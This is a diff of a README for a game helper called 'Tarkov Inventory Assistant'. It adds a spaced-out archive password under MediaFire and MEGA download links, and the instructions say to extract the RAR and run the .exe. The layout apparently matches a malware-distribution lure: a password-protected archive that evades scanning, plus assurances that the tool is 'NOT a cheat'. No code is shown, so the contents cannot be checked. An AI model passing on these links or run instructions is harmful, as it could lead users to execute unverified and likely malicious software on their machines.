@@ -31,7 +31,9 @@ Extract the archive to any folder.
 Run TarkovInventoryAssistant.exe. Configure the capture area once, and you're good to go!
 
 [LINK 1](https://www.mediafire.com/file/2exyyh3c9wf685s/Tarkov_Inventory_Assistant_%2528TIA%2529.rar/file) | [LINK 2](https://mega.nz/file/1ZUCFJLa#fFlcpw7WVW-GuvbXrp-NaS9olA3oglyQ0_pTCwAmhT8)
+
 P A S S - TIA2026
+
 ⚠️ Crucial Legal & Safety Notes
 This is NOT a cheat. It provides only information that is already visible on your screen. It does not give unfair advantages like player positions, aim assistance, or item spawning.
 
